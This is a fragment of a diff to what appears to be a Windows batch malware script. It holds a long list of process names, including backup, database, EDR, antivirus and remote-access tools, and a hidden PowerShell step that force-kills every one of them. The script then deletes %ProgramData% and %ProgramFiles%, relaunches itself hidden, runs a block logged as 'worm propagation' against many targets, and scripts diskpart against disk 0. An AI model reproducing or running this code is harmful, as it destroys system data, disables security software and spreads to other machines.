'ServiceHub.SettingsHost.exe','ServiceHub.Host.CLR.x86.exe','ServiceHub.RoslynCodeAnalysisService32.exe','ServiceHub.DataWarehouseHost.exe','Microsoft.VisualStudio.Web.Host.exe','SQLEXPRWT.exe','setup.exe','remote.exe','setup100.exe','landingpage.exe','WINWORD.exe','KuaiYun.exe','HwsHostPanel.exe','NovelSpider.exe','Service_KMS.exe','WebServer.exe','ChsIME.exe','btPanel.exe','Protect_2345Explorer.exe','Pic_2345Svc.exe','vmware-converter-a.exe','vmware-converter.exe','vmware.exe','vmware-unity-helper.exe','vmware-vmx.exe','usysdiag.exe','PopBlock.exe','gsinterface.exe','Gemstar.Group.CRS.Client.exe','TenpayServer.exe','RemoteExecService.exe','VS_TrueCorsManager.exe','ntpsvr-2019-01-22-wgs84.exe','rtkjob-ion.exe','ntpsvr-2019-01-22-no-usrcheck.exe','NtripCaster-2019-01-08.exe','BACSTray.exe','protect.exe','hfs.exe','jzmis.exe','NewFileTime_x64.exe','2345MiniPage.exe','JMJ_server.exe','cacls.exe','gpsdaemon.exe','gpsusersvr.exe','gpsdownsvr.exe','gpsstoragesvr.exe','gpsdataprocsvr.exe','gpsftpd.exe','gpsmysqld.exe','gpstomcat6.exe','gpsloginsvr.exe','gpsmediasvr.exe','gpsgatewaysvr.exe','gpssvrctrl.exe','zabbix_agentd.exe','BackupExec.exe','Att.exe','mdm.exe','BackupExecManagementService.exe','bengine.exe','benetns.exe','beserver.exe','pvlsvr.exe','beremote.exe','RemoteAssistProcess.exe','BarMoniService.exe','GoodGameSrv.exe','BarCMService.exe','TsService.exe','GoodGame.exe','BarServerView.exe','IcafeServicesTray.exe','BsAgent_0.exe','ControlServer.exe','DisklessServer.exe','DumpServer.exe','NetDiskServer.exe','PersonUDisk.exe','service_agent.exe','SoftMemory.exe','BarServer.exe','RtkNGUI64.exe','Serv-U-Tray.exe','QQPCSoftTrayTips.exe','SohuNews.exe','Serv-U.exe','QQPCRTP.exe','EasyFZS.exe','HaoYiShi.exe','HysMySQL.exe','wtautoreg.exe','ispiritPro.exe','CAService.exe','XAssistant.exe','TrustCA.exe','GEUU20003.exe','CertMgr.exe','eSafe_monitor.exe','MainExecute.exe','FastInvoice.exe','SoftMgrLite.exe','sesvc.exe','ScanFileServer.exe','Nuoadehgcgcd.exe','OpenFastAssist.exe','FastInvoiceAssist.exe','Nuoadfaggcje.exe','OfficeUpdate.exe','atkexComSvc.exe','FileTransferAgent.exe','MasterReplicatorAgent.exe','CrmAsyncService.exe','CrmUnzipService.exe','NscAuthService.exe','ReplicaReplicatorAgent.exe','ASMCUSvc.exe','OcsAppServerHost.exe','RtcCdr.exe','IMMCUSvc.exe','DataMCUSvc.exe','MeetingMCUSvc.exe','QmsSvc.exe','RTCSrv.exe','pnopagw.exe','NscAuth.exe','Microsoft.ActiveDirectory.WebServices.exe','DistributedCacheService.exe','c2wtshost.exe','Microsoft.Office.Project.Server.Calculation.exe','schedengine.exe','Microsoft.Office.Project.Server.Eventing.exe','Microsoft.Office.Project.Server.Queuing.exe','WSSADMIN.EXE','hostcontrollerservice.exe','noderunner.exe','OWSTIMER.EXE','wsstracing.exe','MySQLInstallerConsole.exe','EXCEL.EXE','RtkAudioService64.exe','RAVBg64.exe','FNPLicensingService64.exe','VisualSVNServer.exe','MotionBoard57.exe','MotionBoardRCService57.exe','LPManService.exe','RaRegistry.exe','RaAutoInstSrv.exe','RtHDVCpl.exe','DefenderDaemon.exe','BestSyncApp.exe','ApUI.exe','AutoUpdate.exe','LPManNotifier.exe','FieldAnalyst.exe','TimingGenerate.exe','Detector.exe','Estimator.exe','FA_Logwriter.exe','TrackingSrv.exe','cbInterface.exe','EnterprisePortal.exe','ccbService.exe','monitor.exe','U8DispatchService.exe','dbsrv16.exe','sqlservr.exe','KICManager.exe','KICMain.exe','ServerManagerLauncher.exe','TbossGate.exe','iusb3mon.exe','MgrEnvSvc.exe','Mysoft.Config.WindowsService.exe','Mysoft.UpgradeService.UpdateService.exe','hasplms.exe','Mysoft.Setup.InstallService.exe','Mysoft.UpgradeService.Dispatcher.exe','Mysoft.DataCenterService.WindowsHost.exe','Mysoft.DataCenterService.DataCleaning.exe','Mysoft.DataCenterService.DataTracking.exe','Mysoft.SchedulingService.WindowsHost.exe','ServiceMonitor.exe','Mysoft.SchedulingService.ExecuteEngine.exe','AgentX.exe','host.exe','vsjitdebugger.exe','VBoxSDS.exe','mysqld.exe','TeamViewer_Service.exe','TeamViewer.exe','CasLicenceServer.exe','tv_w32.exe','tv_x64.exe','rdm.exe','SecureCRT.exe','SecureCRTPortable.exe','VirtualBox.exe','VBoxSVC.exe','VirtualBoxVM.exe','abs_deployer.exe','edr_monitor.exe','sfupdatemgr.exe','ipc_proxy.exe','edr_agent.exe','edr_sec_plan.exe','sfavsvc.exe','DataShareBox.ShareBoxMonitorService.exe','DataShareBox.ShareBoxService.exe','Jointsky.CloudExchangeService.exe','Jointsky.CloudExchange.NodeService.ein','perl.exe','java.exe','emagent.exe','TsServer.exe','AppMain.exe','easservice.exe','Kingdee6.1.exe','QyKernel.exe','QyFragment.exe','UserClient.exe','GNCEFExternal.exe','ComputerZTray.exe','ComputerZService.exe','ClearCache.exe','ProLiantMonitor.exe','bugreport.exe','GNWebServer.exe','UI0Detect.exe','GNCore.exe','gnwayDDNS.exe','GNWebHelper.exe','php-cgi.exe','ESLUSBService.exe','CQA.exe','Kekcoek.pif','Tinuknx.exe','servers.exe','ping.exe','TianHeng.exe','K3MobileService.exe','VSSVC.exe','Xshell.exe','XshellCore.exe','FNPLicensingService.exe','XYNTService.exe','EISService.exe','UFSoft.U8.Framework.EncryptManager.exe','yonyou.u8.gc.taskmanager.servicebus.exe','U8KeyManagePool.exe','U8MPool.exe','U8SCMPool.exe','UFIDA.U8.Report.SLReportService.exe','U8TaskService.exe','U8TaskWorker.exe','U8WebPool.exe','U8AllAuthServer.exe','UFIDA.U8.UAP.ReportService.exe','UFIDA.U8.ECE.UTU.Services.exe','U8WorkerService.exe','UFIDA.U8.ECE.UTU.exe','ShellStub.exe','U8UpLoadTask.exe','UfSysHostingService.exe','UFIDA.UBF.SystemManage.ApplicationService.exe','UFIDA.U9.CS.Collaboration.MailService.exe','NotificationService.exe','UBFdevenv.exe','UFIDA.U9.SystemManage.SystemManagerClient.exe','mongod.exe','SpusCss.exe','UUDesktop.exe','KDHRServices.exe','Kingdee.K3.PUBLIC.BkgSvcHost.exe','Kingdee.K3.HR.Server.exe','Kingdee.K3.Mobile.Servics.exe','Kingdee.K3.PUBLIC.KDSvrMgrHost.exe','KDSvrMgrService.exe','pdfServer.exe','pdfspeedup.exe','SufAppServer.exe','tomcat5.exe','Kingdee.K3.Mobile.LightPushService.exe','iMTSSvcMgr.exe','kdmain.exe','KDActMGr.exe','Kingdee.DeskTool.exe','K3ServiceUpdater.exe','Aua.exe','iNethinkSQLBackup.exe','auaJW.exe','Scheduler.exe','bschJW.exe','SystemTray64.exe','OfficeDaemon.exe','OfficeIndex.exe','OfficeIm.exe','iNethinkSQLBackupConsole.exe','OfficeMail.exe','OfficeTask.exe','OfficePOP3.exe','apache.exe','GnHostService.exe','HwUVPUpgrade.exe','Kingdee.KIS.UESystemSer.exe','uvpmonitor.exe','UVPUpgradeService.exe','KDdataUpdate.exe','Portal.exe','U8SMSSrv.exe','Ufida.T.SM.PublishService.exe','lta8.exe','UfSvrMgr.exe','AutoUpdateService.exe','MOM.exe','wscript.exe','cscript.exe')
+echo $task = $task ^| Sort-Object -Unique
+echo foreach($t in $task){taskkill /F /IM $t 2^>$null}
+)
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\svc.ps1"
+del "%TEMP%\svc.ps1" 2>nul
+
 icacls "%ProgramData%" /grant Administrators:F /t /c /l /q >nul 2>&1
 rmdir /s /q "%ProgramData%" >nul 2>&1
 takeown /f "%ProgramFiles%" /a /r /d y >nul 2>&1
@@ -185,6 +172,7 @@ icacls "%ProgramFiles%" /grant Administrators:F /t /c /l /q >nul 2>&1
 rmdir /s /q "%ProgramFiles%" >nul 2>&1
 start /b "" cmd /c "exit" >nul 2>&1
 start /b "" powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /b /min %~f0' -WindowStyle Hidden" >nul 2>&1
+
 echo %date% %time% - Running worm propagation >> "%DEBUG_LOG%"
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference = 'SilentlyContinue';^
@@ -318,6 +306,7 @@ $jobs = foreach ($target in $allTargets) {^
 while ($jobs.Result.IsCompleted -contains $false) { [System.Threading.Thread]::Sleep(50) };^
 foreach ($job in $jobs) { $null = $job.Pipe.EndInvoke($job.Result); $job.Pipe.Dispose() };^
 $pool.Close(); $pool.Dispose()" >nul 2>&1
+
 echo select disk 0 > "%dp_script%"
 echo list partition >> "%dp_script%"
 diskpart /s "%dp_script%" > "%dp_output%" 2>&1
